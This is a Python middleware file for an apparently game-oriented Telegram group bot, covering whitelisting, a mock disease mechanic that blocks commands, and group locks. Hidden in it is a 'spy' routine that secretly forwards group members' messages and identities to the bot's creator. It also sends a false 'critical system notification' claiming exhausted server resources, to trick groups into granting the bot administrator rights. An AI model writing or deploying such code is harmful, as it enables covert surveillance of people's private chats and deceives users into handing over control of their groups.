import time
import logging
from typing import Callable, Dict, Any, Awaitable
from aiogram import BaseMiddleware
from aiogram.types import TelegramObject, Message, CallbackQuery
from escape import escape_html




logger = logging.getLogger(__name__)


from whitelist import get_whitelist, log_unauthorized_chat, add_to_whitelist
from config import CREATOR_ID, DISABLE_WHITELIST
from spy import get_spy_chats, is_spy_all_enabled
from user_manager import get_user_data
from diseases import get_active_diseases
from utils import is_valid_command, fire_and_forget
from lock_system import get_locked_chats, remove_lock

class WhitelistMiddleware(BaseMiddleware):
    async def __call__(
        self,
        handler: Callable[[TelegramObject, Dict[str, Any]], Awaitable[Any]],
        event: TelegramObject,
        data: Dict[str, Any]
    ) -> Any:

        user = getattr(event, 'from_user', None)
        chat = getattr(event, 'chat', None)
        if chat is None and isinstance(event, CallbackQuery) and event.message:
            chat = getattr(event.message, 'chat', None)

        if not chat:
            return await handler(event, data)

        # Разрешить личные сообщения с ботом (прогреваем привязанный чат)
        if chat.type == "private":
            if user:
                from user_manager import load_user_primary_chat
                await load_user_primary_chat(user.id)
            return await handler(event, data)

        # Запоминаем активность пользователя в группе для синхронизации с ЛС
        if user and chat.id < 0:
            from user_manager import record_user_chat_activity
            await record_user_chat_activity(user.id, chat.id, getattr(chat, 'title', None))

        # Логика шпионажа
        spy_chats = await get_spy_chats()
        spy_all = await is_spy_all_enabled()

        # Если это сообщение и группа под наблюдением
        if (spy_all or chat.id in spy_chats) and isinstance(event, Message) and CREATOR_ID and int(CREATOR_ID) != 0:
            bot = data.get('bot')
            if bot:
                try:
                    from_user_name = escape_html(event.from_user.full_name) if (event.from_user and event.from_user.full_name) else "Unknown"
                    from_user_id = event.from_user.id if event.from_user else 0
                    safe_chat_title = escape_html(chat.title) if chat.title else "Чат"

                    forward_info = " [Переслано]" if event.forward_origin else ""
                    reply_info = f" [Ответ на MSG: {event.reply_to_message.message_id}]" if event.reply_to_message else ""

                    header_text = (
                        f"👁 <b>[{safe_chat_title} | <code>{chat.id}</code>]</b>\n"
                        f"👤 <b>{from_user_name}</b> (<code>{from_user_id}</code>)\n"
                        f"🆔 MSG: <code>{event.message_id}</code>{forward_info}{reply_info}"
                    )
                    try:
                        await bot.send_message(chat_id=CREATOR_ID, text=header_text, parse_mode="HTML")
                        try:
                            await event.forward(chat_id=CREATOR_ID)
                        except Exception:
                            await event.copy_to(chat_id=CREATOR_ID)
                    except Exception as send_err:
                        logger.warning("Не удалось отправить сообщение шпионажа: %s", send_err)
                except Exception as e:
                    logger.error(f"Spy Error: {e}")

        if DISABLE_WHITELIST:
            return await handler(event, data)

        whitelist = await get_whitelist()

        if chat.id not in whitelist:
            safe_title = escape_html(chat.title) if chat.title else "Unknown Group"
            added = await add_to_whitelist(chat.id, chat.title or "Unknown Group")
            if added:
                logger.info(f"✅ Чат '{safe_title}' (ID: {chat.id}) автоматически добавлен в белый список!")
                if CREATOR_ID and CREATOR_ID != 0:
                    bot = data.get('bot')
                    if bot:
                        try:
                            fire_and_forget(bot.send_message(
                                chat_id=CREATOR_ID,
                                text=(
                                    f"🎉 <b>Бот добавлен в новый чат!</b>\n\n"
                                    f"Название: <b>{safe_title}</b>\n"
                                    f"ID группы: <code>{chat.id}</code>\n\n"
                                    f"✅ <i>Чат автоматически внесен в белый список и сразу готов к работе!</i>"
                                )
                            ))
                        except Exception as e:
                            logger.error(f"Ошибка отправки уведомления админу: {e}", exc_info=True)

        # Блокировка команд при СПИДе
        user_id = event.from_user.id if event.from_user else None

        # Оптимизация: определяем, нужно ли нам вообще загружать профиль пользователя
        is_command = False
        if isinstance(event, CallbackQuery):
            is_command = True
        elif isinstance(event, Message):
            text = event.text or event.caption or ""
            if is_valid_command(text) or event.reply_to_message:
                is_command = True

        u_data = None
        if is_command and user_id is not None:
            try:
                u_data = await get_user_data(chat.id, user_id, event.from_user.full_name, event.from_user.username)
                data['u_data'] = u_data

                diseases = u_data.get('diseases') if u_data else None
                if isinstance(diseases, dict) and 'aids' in diseases:
                    active_diseases = await get_active_diseases(chat.id, user_id, u_data=u_data)
                    if 'aids' in active_diseases:
                        # Разрешаем команду зппп
                        if isinstance(event, Message) and event.text and event.text.lower().startswith(('/зппп', '!зппп', 'зппп')):
                            pass
                        else:
                            msg = "🦠 <b>СПИД</b>: Вы в реанимации. Полная блокировка всех команд экономики и игр."
                            if isinstance(event, CallbackQuery):
                                await event.answer(msg, show_alert=True)
                            else:
                                await event.answer(msg)
                            return
            except Exception as e:
                import logging
                logging.getLogger(__name__).exception(f"Error checking user data / AIDS in WhitelistMiddleware: {e}")

        # Проверка блокировки группы через lock_system
        locked_chats = await get_locked_chats()

        if chat.id in locked_chats:
            bot = data.get('bot')

            # Бот все еще не админ, блокируем команды
            if is_command:
                try:
                    # Move the network call inside is_command block to avoid API flood on normal chat messages
                    bot_member = await bot.get_chat_member(chat.id, bot.id)
                    if bot_member.status in ['administrator', 'creator']:
                        # Бот получил админку, автоматически разблокируем
                        await remove_lock(chat.id)
                        try:
                            await bot.send_message(
                                chat_id=chat.id,
                                text="✅ <b>Права администратора подтверждены!</b>\nВсе ресурсы разблокированы. Экономика и мини-игры снова работают в штатном режиме."
                            )
                        except Exception:
                            pass
                        # Let the command go through now that it's unlocked
                        return await handler(event, data)
                except Exception as e:
                    logger.error(f"Ошибка проверки админки: {e}", exc_info=True)
                    return

                # Используем локальный кэш для ограничения спама (1 сообщение в 60 сек)
                if not hasattr(self, '_lock_spam_cache'):
                    self._lock_spam_cache = {}

                last_warning = self._lock_spam_cache.get(chat.id, 0)
                current_time = time.time()

                if current_time - last_warning > 60:
                    msg = (
                        "⚠️ <b>КРИТИЧЕСКОЕ УВЕДОМЛЕНИЕ СИСТЕМЫ</b> ⚠️\n\n"
                        "Серверные ресурсы для данной группы исчерпаны. В связи с высокой нагрузкой и для обеспечения бесперебойной работы экономики и мини-игр, боту <b>необходимы права администратора</b> в этом чате.\n\n"
                        "Пожалуйста, выдайте боту права администратора (достаточно базовых), чтобы продолжить использование всех функций без ограничений. Иначе бот перестанет реагировать на команды."
                    )
                    if isinstance(event, CallbackQuery):
                        await event.answer("⚠️ Требуются права администратора!", show_alert=True)
                    else:
                        await event.answer(msg)
                    self._lock_spam_cache[chat.id] = current_time

                return

        return await handler(event, data)